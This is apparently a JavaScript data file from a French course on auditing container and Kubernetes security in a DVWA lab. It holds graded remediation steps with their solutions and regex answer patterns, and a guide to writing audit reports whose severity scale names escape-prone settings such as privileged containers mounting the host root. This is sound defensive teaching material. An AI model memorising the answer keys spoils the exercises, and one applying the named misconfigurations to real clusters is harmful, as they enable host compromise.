            motifs: ["^kubectl\\s+delete\\s+clusterrolebinding\\s+dvwa-too-permissive"],
            solution: "kubectl delete clusterrolebinding dvwa-too-permissive",
            sortie: "clusterrolebinding.rbac.authorization.k8s.io \"dvwa-too-permissive\" deleted"
          },
          {
            enonce: "CORRECTIF RÉSEAU : appliquez une NetworkPolicy deny-par-défaut sur `dvwa-lab` (fichier `deny-all.yaml`).",
            indice: "`kubectl apply -f deny-all.yaml -n dvwa-lab`.",
            motifs: ["^kubectl\\s+apply\\s+-f\\s+deny-all\\.yaml", "-n\\s+dvwa-lab"],
            solution: "kubectl apply -f deny-all.yaml -n dvwa-lab",
            sortie: "networkpolicy.networking.k8s.io/default-deny created   ← plus d'egress : le reverse shell ne sortira plus"
          },
          {
            enonce: "CORRECTIF POD : appliquez le déploiement durci `dvwa-hardened.yaml` (non-root, no-privileged, FS read-only).",
            indice: "`kubectl apply -f dvwa-hardened.yaml -n dvwa-lab`.",
            motifs: ["^kubectl\\s+apply\\s+-f\\s+dvwa-hardened\\.yaml", "-n\\s+dvwa-lab"],
            solution: "kubectl apply -f dvwa-hardened.yaml -n dvwa-lab",
            sortie: "deployment.apps/dvwa configured   ← securityContext durci appliqué"
          },
          {
            enonce: "VÉRIFICATION : le ServiceAccount peut-il encore créer des pods ?",
            indice: "Rejouez le `auth can-i create pods`.",
            motifs: ["^kubectl\\s+auth\\s+can-i\\s+create\\s+pods", "serviceaccount:dvwa-lab:default"],
            solution: "kubectl auth can-i create pods --as=system:serviceaccount:dvwa-lab:default -n dvwa-lab",
            sortie: "no   ← RBAC corrigé. Audit bouclé : trouvailles constatées, correctifs appliqués et vérifiés."
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 7 — RÉDIGER UN RAPPORT D'AUDIT
     ========================================================= */
  C.guides.push({
    id: "guide-rapport-audit",
    titre: "Rédiger un rapport d'audit",
    resume: "Comment structurer et écrire le livrable : plan imposé, échelle de sévérité, anatomie d'une trouvaille (finding), et bonnes pratiques de rédaction. Le rendu du TP3.",
    duree: "20 min",
    niveau: "Intermédiaire",
    prealables: [
      "Avoir mené un audit (voir « Atelier final »).",
      "Disposer des preuves : commandes tapées et leurs sorties."
    ],
    sections: [
      {
        type: "notion",
        titre: "Un rapport, pour qui ?",
        texte: "Le rapport doit être **compréhensible par n'importe qui** : le RSSI qui priorise, l'admin qui corrige, le manager qui décide. On explique le contexte, on prouve chaque trouvaille, on donne une remédiation concrète. Pas de faille annoncée sans **preuve** ni **correctif**."
      },
      {
        titre: "La structure imposée",
        texte: "Le plan attendu, dans l'ordre (format du TP3).",
        tableau: {
          entetes: ["Section", "Contenu"],
          lignes: [
            ["Page de garde", "Titre, date, auteurs (NOM + Prénom), destinataire"],
            ["Sommaire", "Table des matières paginée"],
            ["Contexte / périmètre", "Ce qui est audité (cluster, images, namespaces) et ce qui ne l'est pas"],
            ["Méthodologie", "Outils et démarche (docker inspect, Trivy, kubectl auth can-i, Falco)"],
            ["Trouvailles (findings)", "Une par faiblesse, triée par sévérité décroissante"],
            ["Remédiations", "Le plan d'action priorisé (quoi corriger d'abord)"],
            ["Conclusion", "Synthèse + réponse aux questions transversales"],
            ["Sources", "Références fiables et croisées (CVE, guides ANSSI/NIST, doc éditeur)"]
          ]
        }
      },
      {
        titre: "L'échelle de sévérité",
        texte: "Chaque trouvaille reçoit une sévérité : elle décide de l'ordre des correctifs.",
        tableau: {
          entetes: ["Sévérité", "Critère", "Exemple conteneur"],
          lignes: [
            ["**Critique**", "Compromission immédiate de l'hôte/cluster", "`--privileged` + `-v /:/host` ; socket Docker monté ; `cluster-admin` sur un pod web"],
            ["**Élevée**", "Compromission probable ou fort impact", "CVE CRITICAL exploitable ; RBAC autorisant `create pods` / `get secrets`"],
            ["**Moyenne**", "Impact réel mais conditionné", "Conteneur root sans `--privileged` ; pas de `NetworkPolicy` egress"],
            ["**Faible**", "Mauvaise pratique, impact limité", "Tag `:latest` ; pas de limites de ressources"],
            ["**Info**", "Observation, durcissement conseillé", "Pas de SBOM ; logs non centralisés"]
          ]
        },
        remarque: "En cas de doute, tranchez avec deux questions : quelle est la **probabilité** d'exploitation, et quel serait l'**impact** ? Sévérité = combinaison des deux."
      },
      {
        titre: "Anatomie d'une trouvaille (finding)",
        texte: "Le gabarit à répéter pour chaque faiblesse. Sans **preuve** ni **remédiation**, ce n'est pas un finding.",
        tableau: {
          entetes: ["Champ", "Contenu"],
          lignes: [
            ["Titre", "Court et parlant : « Conteneur DVWA en mode privilégié »"],
            ["Sévérité", "Critique / Élevée / Moyenne / Faible / Info"],
            ["Description", "Ce que c'est et pourquoi c'est un problème, en clair"],
            ["Preuve", "La commande tapée **et** sa sortie (ex. `inspect … Privileged → true`)"],
            ["Impact", "Ce qu'un attaquant en ferait (évasion, vol de données…)"],
            ["Remédiation", "Le correctif précis (`securityContext`, supprimer le montage…)"]
          ]
        }
      },
      {
        titre: "Bonnes pratiques de rédaction",
        texte: "Ce qui distingue un rapport utile d'un tas de captures d'écran.",
        points: [
          "**Reproductible :** on doit pouvoir rejouer chaque preuve à partir du rapport.",
          "**Priorisé :** on corrige les Critiques d'abord — la conclusion le dit clairement.",
          "**Sources croisées :** au moins deux références fiables par sujet (CVE + guide éditeur/ANSSI).",
          "**Sobre :** pas de jargon inutile ; une faille = un paragraphe, pas une page.",
          "**Livré en PDF**, relu, avec sommaire et pagination."
        ]
      }
    ]
  });

})();
